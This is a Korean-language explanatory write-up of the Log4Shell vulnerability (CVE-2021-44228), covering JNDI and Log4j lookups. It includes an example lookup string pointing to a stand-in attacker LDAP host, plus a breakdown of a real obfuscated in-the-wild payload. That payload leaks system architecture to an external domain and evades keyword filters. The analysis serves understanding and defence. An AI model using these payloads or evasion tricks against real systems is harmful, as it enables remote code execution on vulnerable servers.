## 🔧 CVE‑2021‑44228 (Log4Shell) 

Log4j 2의 메시지 치환(lookup) 기능을 통해 공격자가 로그에 포함된 입력값에 `${jndi:...}` 같은 룩업 표현식을 삽입하면, Log4j가 이를 해석하고 JNDI를 통해 원격 자원을 조회/로드하여 원격코드실행(RCE)이 가능한 취약점입니다. 
목적은 서버(특히 취약한 Log4j 인스턴스)가 ${...} 치환을 평가하면서 JNDI를 통해 원격 LDAP 서버로 연결하여 페이로드를 가져오게 하는 것입니다. 

### 공격 과정
1. 애플리케이션이 사용자 입력(예: HTTP 헤더, URI, 파라미터 등)을 로그할 때, Log4j가 `${...}` 룩업을 평가한다면 내부에서 JNDI 룩업을 수행할 수 있음.
2. `${jndi:ldap://attacker.com/a}` 같은 표현이 평가되면 JVM의 JNDI가 LDAP 서버에 접속. LDAP 응답이 클래스 위치(jar/class) 정보를 포함하면 원격 클래스를 로드하고 실행 가능 → RCE.
3. 공격자는 LDAP 외에도 RMI, DNS 등 여러 transport를 악용해 탐지 우회 및 페이로드 전달을 시도할 수 있음.

#### ✅ JNDI(Java Naming and Directory Interface)
Java 애플리케이션에서 Naming(특정 자원이나 객체에 접근할 때 이름을 붙여서 접근) 또는, 다양한 디렉터리 서비스(ex. LDAP, RMI, DNS 등)에 연결하고 해당 서비스에 저장된 데이터를 조회할 때 사용된다.
디렉터리 서비스에 저장된 데이터는 단순 데이터 뿐만 아니라 Java 객체도 저장하고 조회할 수 있다.
따라서, 공격자가 악성 코드가 담긴 LDAP 서버를 구성하고 피해 서버가 악성 LDAP 서버로 요청을 수행하게 되면 최종적으로 피해 서버에 악성 코드(Java 객체)를 응답받아 임의의 코드가 실행된다.

#### ✅ Log4j lookups 기능
로그 메시지에 접두사(ex. java:)를 포함한 키를 입력하고(ex. {java:vm} 형식) 로그를 출력할 때 키에 해당하는 데이터를 조회(변환)하는 기능이다.


### 실제 공격 예시

`recv_adjust_postback.php` 경로에 웹 요청
```
${:-y$}{${afw:-jndi:}${afw:-ldap:}/${-}/${sys${-}:os.arch}.8290bf59.getcreative.mpoj4mt5rcht4m4f9520r5637bp2py73i.109313.xyz}
```

* `${...}` — Log4j 스타일의 룩업/치환 구문. Log4j가 메시지를 포맷할 때 이 내부를 평가하려 함.
* `${afw:-jndi:}` — `afw`라는 lookup이 존재하지 않으면 기본값(`jndi:`)을 사용하라는 문법입니다. 즉 결과적으로 `jndi:`를 만들어내려는 난독화 기법입니다.
* `${afw:-ldap:}` — 마찬가지로 `ldap:`를 만들기 위한 부분 → 두 부분 합쳐 `jndi:ldap:` (실제는 `jndi:ldap:` 또는 `jndi:ldap://` 형태가 되어야 함).
* `${:-y$}` 및 `${-}` — 탐지 우회를 위한 삽입(무의미한 토큰 또는 빈값/하이픈 대신 쓰려는 시도). WAF/정규식 필터가 `jndi` 또는 `ldap` 키워드를 잡으면 이를 우회하기 위해 텍스트를 분해하거나 비표준 토큰을 끼워넣은 것입니다.
* `${sys${-}:os.arch}` — `sys:os.arch` (Java system property lookup)로 대체되어 대상 시스템의 아키텍처(예: `amd64`, `x86_64`, `arm`)를 반환하려 함. 난독화로 `${-}`를 끼워넣어 단순 탐지 규칙 회피.
* `.8290bf59.getcreative...109313.xyz` — 공격자 제어 도메인(하위도메인 조합 포함). `os.arch` 값이 서브도메인 접두로 들어가면서 **타깃별 리다이렉션/식별**과 리모트 리소스 위치를 분리하려는 의도.
<br>
**난독화 해제한 최종 문자열(표준화된 형태)** :

```
${jndi:ldap://<maybe-sep>/<sys:os.arch>.8290bf59.getcreative...109313.xyz}
```

또는

```
${jndi:ldap://<sys:os.arch>.8290bf59.getcreative...109313.xyz}
```

즉, Log4j가 이 룩업을 평가하면 JNDI를 통해 `ldap://...109313.xyz` 로 연결을 시도하게 만들려는 공격입니다.

